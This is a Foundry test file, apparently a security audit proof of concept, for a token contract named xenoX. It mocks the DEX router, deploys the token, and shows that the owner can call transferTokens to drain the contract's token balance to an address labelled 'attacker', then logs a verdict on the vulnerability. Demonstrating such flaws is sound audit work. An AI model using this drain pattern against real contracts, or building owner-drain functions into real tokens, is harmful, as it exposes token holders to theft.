// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/xenoX.sol";

contract OCTDTest is Test {
    xenoX token;
    address owner = address(0x1);
    address attacker = address(0x2);
    address contractAddr;

    // Valid mixed-case addresses for mocking
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant FACTORY = 0xfaC7000000000000000000000000000000000000;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function setUp() public {
        // Setup router mocks
        vm.mockCall(
            ROUTER,
            abi.encodeWithSignature("factory()"),
            abi.encode(FACTORY)
        );
        vm.mockCall(
            ROUTER,
            abi.encodeWithSignature("WETH()"),
            abi.encode(WETH)
        );
        vm.mockCall(
            FACTORY,
            abi.encodeWithSignature("createPair(address,address)"),
            abi.encode(address(0xdead))
        );

        // Deploy token as owner
        vm.startPrank(owner);
        token = new xenoX();
        contractAddr = address(token);
        vm.stopPrank();
    }

    function test_OwnerCanDrainContractTokens() public {
        uint256 scale = 10 ** token.decimals();
        uint256 depositAmount = 1000 * scale;

        // Transfer tokens to contract to create balance
        vm.startPrank(owner);
        token.transfer(contractAddr, depositAmount);
        assertEq(token.balanceOf(contractAddr), depositAmount, "Contract should have tokens");
        vm.stopPrank();

        console.log("--- BEFORE-Trigger ---");
        uint256 contractBalanceBefore = token.balanceOf(contractAddr);
        uint256 attackerBalanceBefore = token.balanceOf(attacker);
        console.log("Contract token balance:", contractBalanceBefore);
        console.log("Attacker token balance:", attackerBalanceBefore);

        console.log("--- Trigger: transferTokens ---");
        vm.prank(owner);
        token.transferTokens(attacker, depositAmount);

        console.log("--- AFTER-Trigger ---");
        uint256 contractBalanceAfter = token.balanceOf(contractAddr);
        uint256 attackerBalanceAfter = token.balanceOf(attacker);
        console.log("Contract token balance:", contractBalanceAfter);
        console.log("Attacker token balance:", attackerBalanceAfter);

        // Differential verification
        bool vulnerabilityExists = 
            contractBalanceBefore != 0 && 
            contractBalanceAfter == 0 && 
            attackerBalanceAfter == attackerBalanceBefore + depositAmount;
        
        // Print conclusive verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Owner successfully drained contract tokens");
        } else {
            console.log("Vulnerability not Exist: Drain operation failed");
        }
    }
}